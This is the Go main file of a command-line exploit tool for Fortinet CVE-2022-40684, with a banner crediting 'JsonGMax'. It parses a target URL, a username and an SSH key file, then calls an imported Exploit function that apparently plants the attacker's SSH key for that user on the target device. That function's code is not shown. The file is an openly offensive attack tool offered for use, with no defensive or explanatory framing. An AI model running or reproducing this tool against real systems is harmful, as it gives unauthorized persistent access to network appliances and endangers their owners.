package main

import (
	exp "Fortinet-CVE-2022-40684/lib/c_2022_40684"
	"flag"
	"fmt"
	"github.com/dimiro1/banner"
	"github.com/mattn/go-colorable"
	"os"
)

var (
	urlInput string
	username string
	filePath string
)

func usage() {
	fmt.Println(`Usage of main:
	-t target
		  you target, example: https://192.168.1.1
	-u username
		  user to add an SSH key file for
	-f key file
		  ssh key file`)
}

func bannerPrint() {
	bannerTemplate := fmt.Sprintf(`{{ .Title "%s" "smisome1" 4}}`, "FT Tools")
	banner.InitString(colorable.NewColorableStdout(), true, true, bannerTemplate)
	fmt.Println("by    JsonGMax")
}

func main() {
	flag.StringVar(&urlInput, "t", "", "target")
	flag.StringVar(&username, "u", "", "username")
	flag.StringVar(&filePath, "f", "", "ssh key file")
	flag.Usage = usage
	flag.Parse()
	bannerPrint()
	if urlInput == "" || username == "" || filePath == "" {
		usage()
		os.Exit(0)
	}
	exp.Exploit(urlInput, username, filePath)
}
